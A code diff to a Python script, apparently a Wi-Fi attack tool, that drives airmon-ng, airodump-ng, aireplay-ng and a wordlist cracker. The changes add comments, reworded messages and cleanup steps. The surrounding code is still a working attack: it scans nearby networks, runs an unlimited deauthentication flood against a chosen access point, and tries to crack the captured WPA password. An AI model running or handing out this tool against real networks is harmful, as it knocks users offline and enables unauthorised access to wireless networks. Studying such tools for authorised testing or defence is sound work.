@@ -10,6 +10,7 @@ from datetime import datetime
 
 active_wireless_networks = []
 
+
 def check_for_essid(essid, lst):
     if len(lst) == 0:
         return True
@@ -18,10 +19,12 @@ def check_for_essid(essid, lst):
             return False
     return True
 
+
 if not 'SUDO_UID' in os.environ.keys():
     print("Run this program with sudo.")
     exit()
 
+# Backup existing CSV files
 for file_name in os.listdir():
     if ".csv" in file_name:
         directory = os.getcwd()
@@ -32,14 +35,15 @@ for file_name in os.listdir():
         timestamp = datetime.now()
         shutil.move(file_name, f"{directory}/backup/{timestamp}-{file_name}")
 
+# Detect Wi-Fi interfaces in managed mode
 wlan_pattern = re.compile("^wlan[0-9]+")
 check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
 
 if len(check_wifi_result) == 0:
-    print("Connect a WiFi controller and try again.")
+    print("No managed mode Wi-Fi adapters found. Connect a Wi-Fi adapter and try again.")
     exit()
 
-print("Available WiFi interfaces:")
+print("Available WiFi interfaces (managed mode):")
 for index, item in enumerate(check_wifi_result):
     print(f"{index} - {item}")
 
@@ -53,11 +57,13 @@ while True:
 
 hacknic = check_wifi_result[int(wifi_interface_choice)]
 
+# Switch to monitor mode
 print("WiFi adapter connected! Killing conflicting processes...")
 subprocess.run(["sudo", "airmon-ng", "check", "kill"])
-print("Putting WiFi adapter into monitored mode:")
+print(f"Putting {hacknic} into monitor mode...")
 subprocess.run(["sudo", "airmon-ng", "start", hacknic])
 
+# Discover access points
 discover_access_points = subprocess.Popen(
     ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", hacknic + "mon"],
     stdout=subprocess.DEVNULL,
@@ -90,6 +96,7 @@ try:
 except KeyboardInterrupt:
     pass
 
+# Select a network
 while True:
     choice = input("Select a network: ")
     try:
@@ -100,6 +107,7 @@ while True:
 
 hackbssid = active_wireless_networks[int(choice)]["BSSID"]
 hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
+
 # Ask user for action
 while True:
     attack_choice = input("Do you want to (1) De-authenticate only or (2) De-authenticate and crack the password? [1/2]: ")
@@ -119,7 +127,7 @@ time.sleep(5)  # Let airodump collect initial data
 print("Launching de-authentication attack for 1 minute...")
 subprocess.Popen(
     [
-        "x-terminal-emulator", "-e", 
+        "x-terminal-emulator", "-e",
         f"bash -c 'sudo aireplay-ng --deauth 0 -a {hackbssid} {hacknic}mon; exec bash'"
     ]
 )
@@ -129,6 +137,7 @@ airodump_process.terminate()
 
 if attack_choice == "1":
     print("De-authentication attack completed. Exiting program.")
+    subprocess.run(["sudo", "airmon-ng", "stop", hacknic + "mon"])
     exit()
 
 print("Proceeding to crack the Wi-Fi password...")
@@ -150,6 +159,7 @@ if password_match:
 else:
     print("Password not found. Try using a different wordlist.")
 
+# Revert to managed mode
 print("Restoring Wi-Fi adapter to managed mode...")
 subprocess.run(["sudo", "airmon-ng", "stop", hacknic + "mon"])
 
@@ -159,4 +169,3 @@ if hacknic in iwconfig_result:
     print(f"{hacknic} is now in managed mode.")
 else:
     print(f"Failed to restore {hacknic} to managed mode. Please check manually.")
-
